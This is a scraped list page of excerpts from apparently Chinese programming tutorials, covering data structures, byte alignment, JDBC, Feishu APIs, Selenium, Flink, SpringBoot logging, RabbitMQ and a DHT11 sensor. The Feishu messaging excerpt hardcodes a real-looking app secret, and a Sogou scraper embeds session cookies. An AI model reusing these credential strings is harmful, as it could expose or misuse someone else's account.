1.2 链式存储：链栈
1.3 栈与递归
2. 队列
2.1 顺序存储：循环队列
2.2 链式存储：链队列
1. 栈 后进先出 LIFO 先进后出 FILO
Top：栈顶Base：栈底PUSH：插入元素到栈顶，即入栈POP：从栈顶删除最后一个元素，即出栈 1.1 顺序存储：顺序栈 顺序栈的表示：
#define MAXSIZE 100 typedef struct{ SElemType *base; //栈底 SElemType *top; //栈顶 int stacksize; //栈可用最大容量 }SqStack; 初始化：
Status InitStack(SqStack &amp;S){ //创建一个空栈 S.base = (SElemType*)malloc(sizeof(SElemType)); if(!S.base)exit(OVERFLOW); //存储分配失败 S.top = S.base; //栈顶指针 等于 栈底指针 S.stacksize = MAXSIZE; return OK; } 判断栈是否为空：
Status StackEmpty(SqStack S){ // 若栈为空 返回TRUE if(S.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b614498b8261ff3d8ce3ae190ff64c75/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/38274f2efb7a6175ffea59663e4e6f90/" rel="bookmark">
			什么是字节对齐？字节对齐与位域的计算
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 1.什么是字节对齐？为什么要字节对齐？2.字节对齐的规则3.字节对齐的数值4.位域5.位域的填充 1.什么是字节对齐？为什么要字节对齐？ 字节对齐也称为字节填充， 它是一种牺牲空间换取时间的方法。
字节对齐的作用不仅是便于CPU的快速访问，使CPU的性能达到最佳，而且可以有效地节省存储空间。
例如，32位计算机的数据传输是4字节，64位计算机的数据传输是8字节，这样，struct在默认情况下，编译器会对struct的结构进行（32位机）4的倍数或（64位机）8的倍数的数据对齐。
对于32位机来说，4字节的对齐能够使CPU访问速度提高，如一个long类型的变量，如果跨越了4字节边界存储，那么CPU要读取两次，这样效率就低了。但需要注意的是，如果在32位机中使用1字节或者2字节对齐，不仅不会提高效率，反而会使访问速度降低。
2.字节对齐的规则 结构体每个成员相对于结构体首地址的偏移量都是成员大小的整数倍。如有不满足，则需要在成员之间加上相应的填充字节。结构体的总大小必须为最大对齐数的整数倍，如不满足，则需要在最后一个成员之后加上填充字节。 3.字节对齐的数值 指定对齐参数值：通过#pragma pack(push, n)设置。自身对齐参数值：每个内部类型自身也都有一个对齐参数，一般来说这个对齐参数就是 sizeof(type) 的值，char是1，short是2，int是4，float是4，double是8等。有效对齐参数值：内部类型的有效对齐是指它的自身对齐参数和指定对齐参数中较小的那个值；结构体整体的有效对齐参数值：是指它的成员中，有效对齐参数最大的那个值。 ///&lt; 假设按4字节对齐 #pragma pack(push, 4) struct data { char a;　//a的有效对齐参数值是min（1,4）为1字节，从第1字节开始，占1字节 char b; //b的有效对齐参数值是min（1,4）为1字节，从第2字节开始，占1字节 long long c; //d的有效对齐参数值是min（8,4）为4字节，从第5个字节开始，占8字节 short d; //e的有效对齐参数值是min（2,4）为2字节，从第13个字节开始，占2字节 }; 它们的和为1字节（a）+1字节（b）+2字节（填充）+8字节（c）+2字节（d）=14字节。
因为整体结构体还需要进行对齐，结构成员最大有效对齐参数值为4，所以整个结构为4的整数倍，最后的总大小为4 * 4 = 16字节。
例题：
采用2字节、4字节、8字节对齐时，sizeof(ABC)的值是多少？
typedef struct tagABC { unsigned char ucpa1:2; unsigned char ucpa2:1; unsigned char ucpa3:7; unsigned char ucpa4:6; unsigned char ucpa5:4; unsigned char ucpa6:4; unsigned char ucpa7; unsigned long ulpa8; }ABC; 答案是：10、12、12
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/38274f2efb7a6175ffea59663e4e6f90/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6ce93a1f48ffff9c87c0517a402816d0/" rel="bookmark">
			原来python也能对实现简单的搜狗翻译
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原来python也能对实现简单的搜狗翻译 import hashlib import requests import re if __name__ == '__main__': headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.42', "x-requested-with": "XMLHttpRequest", "origin": "https://fanyi.baidu.com", "referer": "https://fanyi.baidu.com/?aldtype=16047", "Cookie":"ssuid=7578450800; IPLOC=CN3100; SUID=F032E28B1639960A000000006232CC75; SUV=1651048972958935; SMYUV=1654738753827713; ABTEST=7|1663744120|v17; SNUID=1824051C2520CF0CB8634BB5262C535A; wuid=1663744120080; FQV=600dbc0b73aa939b0ef6f5541d5e890c; translate.sess=9e2ec77e-1da9-4f86-9af3-dd742a75c4f5; SGINPUT_UPSCREEN=1663744120480" } text = "hello world" url2=f"https://fanyi.sogou.com/text?keyword={text}&amp;transfrom=auto&amp;transto=zh-CHS&amp;model=general" # content = requests.post(url2, headers=headers, data=data).content.decode() content = requests.get(url2, headers=headers).content.decode() uuid = re.findall(r'&lt;meta name="reqinfo" content="uuid:(.*?),', content)[0] url = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6ce93a1f48ffff9c87c0517a402816d0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0d5d85f2700f0724ad8d8ee3c126e4f7/" rel="bookmark">
			关于vscode终端‘protoc-gen-go‘ 不是内部或外部命令，也不是可运行的程序错误提示解决
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		参考链接：win10下protoc-gen-go不是内外部命令的方案
错误图示：
解决办法：参考了无数博客，比如降低版本啊，重新找下载源等，都没有得到解决，此解决方法也针对于下载编译依赖失败的情况：【以下命令可能由于外网等因素就无法下载正常，也可利下面用github源文件编译来解决】
go install google.golang.org/protobuf/cmd/protoc-gen-go@latest 1、下载 git clone https://github.com/golang/protobuf
下载之后进入目录：C:\Users\18387\Desktop\protobuf\protoc-gen-go【这是我的目录，下载的文件里面】
2、打开dos窗口或者powershell到此目录下：
编译运行一下main.go 生成可执行文件名称为protoc-gen-go.exe 命令如下：
go build -o protoc-gen-go.exe main.go
此时会生成protoc-gen-go.exe；
3、将此可执行文件放到windows/system32/目录底下即可【其实你放到别处比如go安装bin目录下面也可以，其他地方也行，只不过要配置一下环境变量即可】，此时我们再来看看vscode是否能够正常使用
此时可以正常使用了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c906f2c1f6a1e258349e07c67bbffc0a/" rel="bookmark">
			JDBC的封装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
JDBC封装的步骤：
1、在src里面创建一个文件，命名为：database.properties
2、定义实体类：实体类的表名与数据库的表名一致，表中大每一列为实体类的属性
3、将用户对象的所有操作抽取成接口
4、由不同数据库的实现类分别实现接口；实现类实现接口并继承数据库工具类
5、将通用的操作（如打开、关闭连接等）封装到工具类数据库工具类
6、在测试类进行测试
7、单例模式
在编写JDBC时存在一些问题：
1、可读性差
2、不利于后期维护和修改
3、不利于代码复用
采用面向接口编程，可以降低代码间的耦合性
JDBC封装：
1、隔离业务逻辑代码和数据访问代码
2、隔离不同数据库的实现
JDBC封装的步骤： 1、定义实体类传输数据
2、将所有增删改查操作抽取
3、由不同数据库的实现类分别实现接口
4、将通用的操作（打开，关闭连接，增删改查等）封装到数据库工具类BaseDao的通用方法中
具体实现：
1、在src里面创建一个文件，命名为：database.properties 然后在里面添加一下数据
# 加载驱动 driver = com.mysql.jdbc.Driver # 数据库地址 url = jdbc:mysql://127.0.0.1:3306/myschool #用户名 username = root #密码 password = root 2、定义实体类：实体类的表名与数据库的表名一致，表中大每一列为实体类的属性 //创建一个年纪类 public class Grade { /** * 年纪编号 */ private int gradeId; /** * 年假名称 */ private String gradeName; public Grade() { } public Grade(int gradeId, String gradeName) { this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c906f2c1f6a1e258349e07c67bbffc0a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/377af17f19b12e3bfbca41f4ffedf005/" rel="bookmark">
			uniapp＜button＞按钮去掉边框
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		添加plain="true"属性
&lt;button style="background-color: #ffffff;font-size: 30rpx;height: 50rpx;line-height: 50rpx;" plain="true"&gt;退出登录&lt;/button&gt; 在css模块添加：
button[plain] { border: 0 } 这样border就取消了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3e0d9c143c8d3ff840f798d26f53520f/" rel="bookmark">
			java飞书鉴权（对接前端飞书云文档组件）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文基于飞书云文档组件API，地址为https://open.feishu.cn/document/uYjL24iN/uYDO3YjL2gzN24iN3cjN/introduction 我这里主要讲一下后端SDK鉴权流程和对接云文档组件遇到的一些问题 https://open.feishu.cn/document/uYjL24iN/uUDO3YjL1gzN24SN4cjN
准备工作 前端想要使用云文档组件必须先在开发者后台开通权限正在上传…重新上传取消其中前两个是后端获取文件内容需要的权限，如果只用云文档组件不需要获取文件内容则不需要 最后一个是云文档组件必须要开启的，之前因为疏忽没有注意到这个，真实踩过这个坑 ，原文截图： 这个权限如果没开启前端使用时会报错： {code:9,msg:"permission Scope Required"} 并且这个报错在文档里是找不到原因的，别问我为啥知道鉴权 window.webComponent.config({ openId, // 当前登录用户的open id，要确保与生成 signature 使用的 user_access_token 相对应，使用 app_access_token 时此项不填。 signature, // 签名 appId, // 应用 appId timestamp, // 时间戳（毫秒） nonceStr, // 随机字符串 url, // 参与签名加密计算的url jsApiList, // 指定要使用的组件，请根据对应组件的开发文档填写。如云文档组件，填写['DocsComponent'] lang, // 指定组件的国际化语言：en-英文、zh-中文、ja-日文 }).then(res=&gt;{ // 可以在这里进行组件动态渲染 }) 以上为前端鉴权代码，可以看到需要后端传的字段为openId,appId,signature,timestamp,nonceStr,url
openId:只有用个人账号的形式去鉴权的时候才需要传，我这里是直接以app的身份去进行的鉴权，所以就不需要传。
appId:应用id，他的获取需要在开发者后台-创建企业自建应用，然后点击创建的应用进去在凭证与基础信息就能找到了
此时我们获取到了appId和AppSecret,这个最好是保存到后端的配置文件中 appId相当于用户名，所以可以在参数中传递，这个不用太过担心安全问题 timestamp：当前时间戳，取当前时间就行 nonceStr：随机字符串，数字与字母组合，这个使用UUID去掉-就行 url：调用界面的url，参考以下飞书的描述signature：signature放到最后来说，这个是最重要的，篇幅有限，具体步骤请参考飞书： https://open.feishu.cn/document/uYjL24iN/uUDO3YjL1gzN24SN4cjN 其中需要注意的是： access_token是有过期时间的，在未过期时再次获取返回的access_token是不会变的，所以最好是缓存起来，比如放在redis，获取access_token的接口会返回过期时间，就很方便 jsapi_ticket也是有过期时间和使用次数限制的，单次获取的jsapi_ticket只能用一次，也就是每次鉴权都需要使用新的，且过期时间为10分钟 Signature的生成使用sha1代码可以参考：
public static String encode(String str) { if (str == null) { return null; } try { MessageDigest messageDigest = MessageDigest.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3e0d9c143c8d3ff840f798d26f53520f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a1ced7c3e522319b30b98ab3c9c1a9cb/" rel="bookmark">
			selenium处理登录及提示弹窗(此处以python举例,登录弹窗处理已更新)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言非登录弹窗处理登录弹窗处理最简单的处理方式 前言 在web项目中有些功能需要调用外部应用或者提示安装插件窗口以及打开url时需要登录
此篇文章简单讲解一下如何处理这两类弹窗，因为暂未找到登录弹窗的网页，所有登录弹窗等作者后期实现了再补充
非登录弹窗处理 此处拿TX会议做个例子吧 先来看看弹窗是如何出来的
首先打开网站TX会议 在输入框随意输入9位数点加入，标签页会弹出如下弹窗 ====
这个弹窗selenium好像是处理不了的(如果说错还望指出)
这里我们就需要用到键盘事件来处理弹窗，因为我的电脑是Linux系统， 所以选择的是pynput库 安装库,命令如下
pip install pynput 代码如下 提示： 此段代码效果为选择弹窗中间的单选框：如果未达到效果请把sleep里面的数字加大，要选择下面的两个按钮请自行修改代码，弹窗默认聚焦到取消按钮
from time import sleep from selenium import webdriver from pynput import keyboard from pynput.keyboard import Key dri = webdriver.Chrome() dri.get('https://meeting.tencent.com/user-center/joining?meeting_code=123456789') key_o = keyboard.Controller() sleep(3) key_o.press(Key.tab) key_o.release(Key.tab) # 焦点切换到'打开xdg-open'按钮 key_o.press(Key.tab) key_o.release(Key.tab) # 焦点切换到单选框 key_o.press(Key.enter) # 按下回车键选择单选框 key_o.release(Key.enter) 友情提示：press方法千万不要单独使用！！！ press方法千万不要单独使用！！！ press方法千万不要单独使用！！！
登录弹窗处理 登录弹窗有两种处理方式，一种和上面一样，利用pynput库实现，第二种是利用url实现，虽然利用url很简单，但是这里还是说一下第一种处理方式吧
首先和上面一样 需要安装三方库, 上面有命令这里就不写了
登陆验证框如图所示
代码如下
from selenium import webdriver from pynput import keyboard from pynput.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a1ced7c3e522319b30b98ab3c9c1a9cb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d39cf3416ffae34dfcfa5e89f7ec90de/" rel="bookmark">
			实战安卓App，MVVM结构，仿开眼
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		先放开源代码：仿开眼App仓库地址，项目的git展示也在github中，大家自行查看
1、功能介绍 App使用BottomNavigationView + ViewPager2实现底部导航栏，点击切换界面。App部分页面设置沉浸式状态栏提升体验，RV列表添加动画，更加丝滑一些。对RV列表添加FloatingActionButton，可以在用户滑很远想回到上面的时候一键返回。整体结构借鉴了林潼学长的MVVM（比我之前的结构好…）
（1）首页 首页有两个页面，分别是推荐和日报，使用TabLayout和ViewPager2实现页面的切换
（2）社区 社区有三个界面，广场、发现和人气。广场用PhotoView + ViewPager2实现图片的查看（第一次加载的时候有些慢），发现页面实现了Banner轮播图，分类等功能，人气为请求到的各种榜单。
（3）通知 通知没什么好说的…
（4）我的 我的页面也是体现本App一大特色的地方，实现了一键换肤、用户信息修改和收藏功能，前者通过全局的ViewModel实现，设置颜色主题后，通知所有界面主要颜色改变。后两个使用Room实现本地持久化存储。
（5）视频播放界面 视频播放调第三方库，可旋转全屏观看，在界面内可点击收藏，视频播放下面有相关视频推荐和评论。
（6）分类详情界面 视频内容点击更多可展开。
2、技术 （1）App换肤 实现该功能需要获取一个全局的ViewModel，供全局观察，当在设置好颜色之后，将appViewModel.appColor的值改变，在别的界面通过Observe观察其变化，发现其值发生改变，立即修改一些控件的颜色与主题一致。
在Application中，自己定义一个工厂获取到Application的实例，并以此创建ViewModel可以在全局使用。将创建的ViewModel保存到自己的ViewModelStoreOwner中。
// 供全局引用 val appViewModel: AppViewModel by lazy { App.appViewModelInstance } class App : Application(), ViewModelStoreOwner { private var mFactory: ViewModelProvider.Factory? = null private lateinit var mAppViewModelStore: ViewModelStore companion object { @SuppressLint("StaticFieldLeak") lateinit var context: Context lateinit var appViewModelInstance: AppViewModel } // 获取全局的 ViewModel private fun getAppViewModelProvider(): ViewModelProvider { return ViewModelProvider(this, this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d39cf3416ffae34dfcfa5e89f7ec90de/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bb9981782fcf7e0c49f23ad0cdc09583/" rel="bookmark">
			Apache Flink 在小米的稳定性优化和实践
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		摘要：本文整理自小米大数据部高级软件工程师张蛟在 Flink Forward Asia 2021 生产实践专场的演讲。主要内容包括：
发展现状和规模稳定性优化及实践运维优化及实践未来规划与展望 点击查看原文视频 &amp; 演讲PPT
一、发展现状及规模 现阶段，我们的整体架构可以分成5层，数据从下往上流动，如上图。
数据采集层主要负责收集各类数据，数据的来源分为两类，一类是埋点和业务日志以及服务日志，经由 LCS Agent 进行采集，另一类是数据库数据经由 Binlog 或 Checkpoint 数据集成等方式收集到消息队列中。以 Flink、Spark 为主的计算层对其进行处理，并最终存储到各类存储和查询服务中，供业务使用。Flink 是计算层实时和准实时处理的主要框架，在其中正发挥着越来越重要的作用，尤其是 Flink+Iceberg 数据湖技术，正在让流批一体成为现实。
目前我们的集群上运行着 3000 多个作业，主力版本是 1.12，1.14 版本也已经合并上线，日均处理 10 万亿+ 条消息，PB 级的数据量，峰值数据 2 亿条/秒，运行在国内外 10 多个集群，使用超过 45000 个 CPU core，内存使用超过 200tb。
在这样规模的数据处理过程中，我们遇到了许多问题。
作业内存占用不可控，on Yarn 模式非常容易出现 Yarn container OOM kill，导致 container lost，引发作业频繁重启，包括框架内重启。on Yarn 模式无法支持作业自动平滑重启，在机器过保、下线、机房迁移等过程中，只能触发 failover。实时作业对负载较为敏感，启动和运行的过程中需要保证机器性能，避免因离线和在线混部造成影响。Checkpoint 作为 Flink 有状态计算数据一致性的保障，存在稳定性问题。historyserver 默认的清理策略不好设置，导致占用的磁盘空间比较大，访问慢。作业异常时难以确定异常原因和节点，需要查看大量的作业日志，导致故障排查困难。 二、稳定性优化及实践 首先是 Yarn container lost 的优化。Flink JobManager 首先会向 Yarn reCheckpointmanager 申请资源，Yarn reCheckpointmanager 为该申请分配资源后将分配信息返回给 JobManager，然后 JobManager 会根据分配信息去启动 taskmanager，并使之与 JobManager 进行心跳。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bb9981782fcf7e0c49f23ad0cdc09583/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/18dc080bcc0a34a9c3802df88efb604d/" rel="bookmark">
			java之21点游戏(只包含一个玩家和一个庄家,是否抓牌,没有黑杰克)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		完整代码在最后面.
运行截图
​​​​​​​
首先,21点游戏的游戏需要,:
玩家和庄家两个数组(若是多个玩家则增加数组,并把原玩家代码进行复制粘贴,再修改一点点就好),并且游戏开局,先发庄家一张牌,玩家两张牌,10,J,Q,K全部看做10,但是依旧要输出JQK.
开头以及庄家拿牌代码段:
int[] banker=new int[10];//庄家 int[] player=new int[10];//玩家 banker[0]=(int) (Math.random()*12+1);//1~K为1~13点 switch (banker[0]) {//把JQK的点输出文字 case 11: System.out.println("庄家拿到的牌为:J"); break; case 12: System.out.println("庄家拿到的牌为:Q"); break; case 13: System.out.println("庄家拿到的牌为:K"); break; default: System.out.println("庄家拿到的牌为:" + banker[0]); } if(banker[0]&gt;10){//数组只记录JQK本身的值为10 banker[0]=10; } 玩家拿牌代码段:
for (int j = 0; j &lt; 2; j++) { player[j]=(int) (Math.random()*12+1);//玩家获取两张牌 switch (player[j]) {//同理前面 case 11: System.out.println("玩家拿到的牌为:J"); break; case 12: System.out.println("玩家拿到的牌为:Q"); break; case 13: System.out.println("玩家拿到的牌为:K"); break; default: System.out.println("玩家拿到的牌为:" + player[j]); } if (player[j] &gt; 10) {//JQK转为数组里面的10 player[j] = 10; } } 设置一个选择值choose,来判断玩家是否选择拿牌.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/18dc080bcc0a34a9c3802df88efb604d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2f377d0cb90c766e92790f08225d610e/" rel="bookmark">
			SpringBoot日志
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		日志是程序的重要组成部分，如果没有日志，那么程序出现了错误，我们便无法知晓错误发生在哪里。
日志的功能：
1.快速的定位和排查问题；
2.记录用户信息；
3.记录操作信息，可以帮助恢复数据或者定位责任人；
4.记录程序的执行时间，方便获取优化和分析；
在SpringBoot中它是内置了日志框架的，所以只要我们运行SpringBoot日志就会被打印在控制台上。但是输出的日志并不是开发者自己定义和打印的，还有一个问题就是控制台上面的日志是不能保存的，所以从这两个角度出发，提出来两个问题：1.开发者自定义打印日志；2.日志的持久化
开发者自定义打印日志 自定义打印日志的步骤：
1.在程序中得到日志对象； 2.使用日志对象的相关语法输出要打印的对象
上面在获取日志对象时，需要使用日志工厂LoggerFactory，日志工厂需要将每一个类的类型传递进去，这样才知道日志的归属类，才能更方便、更直观定位到文体类。这里的Logger对象是在org.slf4j包小面的。 日志的持久化 日志持久化的方式有两种：
方式一：设置日志的保存路径 #配置日志目录 logging: file: path: C:\Users\86158\Desktop\SSM框架\ssm-framework\ 上面这段代码的意思就是在指定路径下面创建spring.log日志文件
执行程序以后找到指定文件：
默认情况下springboot会有一个最大的日志大小限制，如果日志的文件大于默认的最大日志大小，那么springboot会从新启动一个日志 方式二：设置日志文件的文件名
#方式二：设置日志文件的文件名 logging: file: name: spring.log 上面因为没有指定保存路径，所以它默认是保存在当前项目所在的目录里面：
当然上面也可以指定全路径名 使用lombok的方式来输出日志 当我们现在每一个类里面都要输出打印日志时，每回都去执行
private static Logger logger = LoggerFactory.getLogger(类名.class);这个命名比较麻烦，为了更加方便的输出打印日志，就可以使用lombok的方式： 一：首先添加lombok框架，如果是在创建SpringBoot项目时就添加过lombok框架这里就不用再添加了，pom.xml文件中可以检查自己有没有添加该框架
我这里是添加过了的，如果没有添加的话可以手动添加，这里推荐一个插件，使用该插件可以很方便的添加各种框架：
去设置里面的插件中下载EditStarters这个插件，下载好以后安转插件然后重启IDEA
然后在你的IDEA窗口中右键，选择Generate，然后点击刚才安转好的插件，再点击OK
然后你就可以输入框架的名称，双击响应的框架到项目中
二：使用@Slf4j注解输出日志
lombok的原理 lombok框架他其实就是对代码的一次简化，让程序员不用再重复的编写那些冗余的代码，而是在编译器编译期间lombok自己将那些代码添加进程序。
通过看上面使用lombok框架来打印日志的字节码文件就可以看出，他其实就是一次代码的简化操作：
lombok里面还有更多的注解：
注解 作用 @Getter 自动添加getter方法 @Setter 自动添加setter方法 @ToString 自动添加toString方法 @EqualsAndHashCode 自动添加equals和hashCode方法 组合注解 作用 @Data @Getter+@Setter+@ToString+@EqualsAndHashCode @Slf4j 添加一个名为log的日志，使用slf4j 日志结构 我们只有在认识清楚日志结构以后才能准确定位程序中的问题所在。
日志的级别 在SpringBoot项目中日志一共有6个级别，它们的关系如下图：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2f377d0cb90c766e92790f08225d610e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/770f03d0a87af6dbbbc47ff4bfae1892/" rel="bookmark">
			飞书发送消息
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		import cn.hutool.http.HttpRequest; import cn.hutool.http.HttpResponse; import cn.hutool.http.HttpUtil; import cn.hutool.json.JSON; import cn.hutool.json.JSONUtil; import java.util.HashMap; import java.util.Map; /** * 飞书工具 * @author: czy * @date: 2022-9-14 */ public class FeishuUtil { private static String BEARER = "Bearer "; public static void main(String[] args) { String userId = "1261g424"; String content = "测试消息"; String appId = "cli_a3aad82769235013"; String appSecret = "sAAIjSDpfqG6qSSV6NflIhyQsRl6Dajz"; String msgUrl = "https://open.feishu.cn/open-apis/im/v1/messages?receive_id_type=user_id"; String tokenUrl = "https://open.feishu.cn/open-apis/auth/v3/tenant_access_token/internal"; System.out.println(sendMsg(msgUrl, tokenUrl, appId, appSecret, userId, content)); } /** * 发送消息 * 需要开启机器人能力 * @param msgUrl 发送消息 url * @param tokenUrl 获取token url * @param appId appID 新建组织新建应用，应用详情里获取 * @param appSecret app秘钥 应用详情里获取 * @param userId 用户ID 管理后台-&gt;成员与部门-&gt;查看详情 获取 * @param content 消息内容 * @return */ public static String sendMsg(String msgUrl, String tokenUrl, String appId, String appSecret, String userId, String content) { String token = BEARER + getToken(tokenUrl, appId, appSecret); Map&lt;String, Object&gt; pramMap = new HashMap&lt;&gt;(); Map&lt;String, Object&gt; contentMap = new HashMap&lt;&gt;(); contentMap.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/770f03d0a87af6dbbbc47ff4bfae1892/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/77e3399a29ffc32c90e77df814841993/" rel="bookmark">
			Windows环境下RabbitMQ的安装（安装过程以及解决安装过程的问题）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、准备环境
1.下载Erlang
2.安装RabbitMQ
3.RabbitMQ安装时出现的问题 RabbitMQ的介绍：http://t.csdn.cn/6mSSu
一、准备环境 RabbitMQ是由Erlang语言开发的，所以需要安装Erlang环境以及配置对应的环境变量
1.下载Erlang 1.Erlang下载
官网下载地址：https://www.erlang.org/downloads
这里如果嫌官网下载麻烦，我这里提供了一个20.2的版本：
链接：https://pan.baidu.com/s/13c8brCA39gDJ8FnGdF3m1A 提取码：4vx4
2.安装Erlang
安装过程直接Next，安装路径选择自己需要安装的路径
3.配置环境变量
新建一个 变量名为 ERLNAG_HOME ,变量值为 对应的安装路径
然后找到 path 环境变量，将 %ERLANG_HOME%\bin 加到path环境变量中
4.验证安装是否成功
win+r 进入命令提示符中，输入 erl ，显示你对应的安装版本即为安装成功
2.安装RabbitMQ 1.RabbitMQ 下载
官方下载地址：RabbitMQ Project Announcements — RabbitMQ，下载的RabbitMQ版本要和对应的Erlang版本对应
同样的，这里也提供了一个对应的3.7.4的版本：
链接：https://pan.baidu.com/s/1PFUWTs3vMXldp09Eiymc2g 提取码：plit
2.配置
使用RabbitMQ管理插件RabbitMQ's Management Plugin，可以更好的可视化方式查看RabbitMQ服务器的状态。
win + r进入命令提示符，进入到RabbitMQ安装目录下的sbin目录下，进行RabbitMQ管理插件的安装，安装命令为：
rabbitmq-plugins enable rabbitmq_management 3.查看RabbitMQ是否安装是否成功
rabbitmqctl status 文末会附有RabbitMQ管理插件的常用命令
安装成功，cmd会出现如下场景：
Status of node rabbit@DESKTOP-UHFE6T9 ... [{pid,6740}, {running_applications, [{rabbitmq_management,"RabbitMQ Management Console","3.7.4"}, {rabbitmq_web_dispatch,"RabbitMQ Web Dispatcher"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/77e3399a29ffc32c90e77df814841993/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/35764234cc9dc8c102ab8b79ca6b4424/" rel="bookmark">
			【正点原子STM32连载】第四十章 DHT11数字温湿度传感器 摘自【正点原子】MiniPro STM32H750 开发指南_V1.1
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1）实验平台：正点原子MiniPro H750开发板
2）平台购买地址：https://detail.tmall.com/item.htm?id=677017430560
3）全套实验源码+手册+视频下载地址：http://www.openedv.com/thread-336836-1-1.html
4）对正点原子STM32感兴趣的同学可以加群讨论：879133275
第四十章 DHT11数字温湿度传感器 本章，我们将介绍数字温湿度传感器DHT11的使用，与前一章的温度传感器相比，该传感器不但能测温度，还能测湿度。我们将学习如何获取DHT11传感器的温湿度数据，并把数据显示在LCD上。
本章分为如下几个小节：
40.1 DHT11及其时序简介
40.2 硬件设计
40.3 程序设计
40.4 下载验证
40.1 DHT11及时序简介
40.1.1 DHT11简介
DHT11是一款温湿度一体化的数字传感器。该传感器包括一个电阻式测湿元件和一个NTC测温元件，并与一个高性能8位单片机相连接。通过单片机等微处理器简单的电路连接就能够实时的采集本地湿度和温度。DHT11与单片机之间能采用简单的单总线进行通信，仅仅需要一个I/O口。传感器内部湿度和温度数据40Bit的数据一次性传给单片机，数据采用校验和方式进行校验，有效的保证数据传输的准确性。DHT11功耗很低，5V电源电压下，工作平均最大电流0.5mA。
DHT11的技术参数如下：
工作电压范围：3.3V ~ 5.5V
工作电流：平均0.5mA
输出：单总线数字信号
测量范围：湿度5 ~ 95%RH，温度-20 ~ 60℃
精度：湿度±5%，温度±2℃
分辨率：湿度1%，温度0.1℃
DHT11的管脚排列如图40.1.1所示：
图40.1.1.1 DHT11管脚排列图
40.1.2 DHT11时序简介
虽然DHT11与DS18B20类似，都是单总线访问，但是DHT11的访问，相对DS18B20来说简单很多。下面我们先来看看DHT11的数据结构。
DHT11数字温湿度传感器采用单总线数据格式。即，单个数据引脚端口完成输入输出双向传输。其数据包由5byte(40bit)组成。数据分小数部分和整数部分，一次完整的数据传输为40bit，高位先处。DHT11的数据格式为：8bit湿度整数数据+8bit湿度小数数据+8bit温度整数数据+8bit温度小数部分+8bit校验和。其中校验和数据为前面四个字节相加。
传感器数据输出的是未编码的二进制数据。数据（湿度、温度、整数、小数）之间应该分开处理。例如，某次从DHT11读到的数据如图40.1.2.1所示：
图40.1.2.1 某次读取到DHT11数据
由以上数据就可得到湿度和温度的值，计算方法：
湿度 = byte4 . byte3 = 45.0(%RH)
温度 = byte2 . byte1 = 28.0(℃)
校验 = byte4 + byte3 + byte2 + byte1 = 73 (= 湿度 + 温度) （校验正确）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/35764234cc9dc8c102ab8b79ca6b4424/">Read more…</a>
	</div>
</article><article class="list__item post">
	
